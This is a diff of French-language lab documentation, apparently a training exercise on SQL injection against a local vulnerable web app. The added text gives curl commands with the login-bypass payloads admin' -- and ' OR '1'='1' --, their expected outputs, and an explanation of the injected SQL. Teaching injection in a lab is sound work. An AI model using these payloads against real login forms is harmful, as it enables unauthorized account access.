@@ -1203,21 +1203,38 @@ curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
 2. Injecter `admin' --` → bypass du mot de passe
 3. Injecter `' OR '1'='1' --` → connexion en tant que tous les utilisateurs
 
-**Commande :**
+> ⚠️ **Ne pas utiliser le formulaire HTML dans le navigateur.** Les navigateurs peuvent encoder ou interpréter les caractères `'`, `--`, `#`. Utilisez **curl** pour envoyer les données exactes.
+
+**Commandes :**
+
 ```bash
-curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
-# → Identifiants incorrects  (comportement normal)
+# 1. Mauvais mot de passe (comportement normal)
+curl -s -d "page=login&username=admin&password=wrong" \
+  "http://localhost:8083/" | grep -o "Identifiants incorrects\|Connecté"
+# → Identifiants incorrects
 
-curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
-# → Connecté en tant que admin  (bypass du mot de passe réussi)
+# 2. Injection admin' -- (bypass du mot de passe)
+curl -s -d "page=login&username=admin' --&password=x" \
+  "http://localhost:8083/" | grep -o "Connecté[^<]*"
+# → Connecté : <strong>admin</strong>
 
-curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
-# → 6  (tous les utilisateurs connectés)
+# 3. Injection ' OR '1'='1' -- (tous les utilisateurs)
+curl -s -d "page=login&username=' OR '1'='1' --&password=x" \
+  "http://localhost:8083/" | grep -c "Connecté"
+# → 6
 ```
 
-**Résultat attendu :** `admin' --` se connecte sans mot de passe. `' OR '1'='1' --` connecte 6 utilisateurs.
+> 💡 **Pourquoi `admin' --` fonctionne ?** La requête SQL devient :  
+> `WHERE username = 'admin' --' AND password = 'md5(x)'`  
+> Le `'` ferme la chaîne `username`, ` --` commente le reste (vérification du mot de passe).  
+> Avec `' OR '1'='1' --` : `WHERE username = '' OR '1'='1' --' AND ...` — la condition `'1'='1'` est toujours vraie pour tous les utilisateurs.
 
-**Explication :** La requête SQL vulnérable est `WHERE username = '$u' AND password = '$hash'`. Avec `admin' --`, le `'` ferme la chaîne et `--` commente la vérification du mot de passe. `' OR '1'='1'` rend la condition toujours vraie pour tous les utilisateurs.
+**Résultat attendu :**
+| Test | Commande | Sortie |
+|------|----------|--------|
+| Mauvais password | `curl ... admin & password=wrong` | `Identifiants incorrects` |
+| `admin' --` | `curl ... admin' -- & password=x` | `Connecté : admin` |
+| `' OR '1'='1' --` | `curl ... ' OR '1'='1' -- & password=x` | 6 résultats `Connecté` |
 
 #### Point 3 — Filtre `?filter=` (LIKE injection)
 
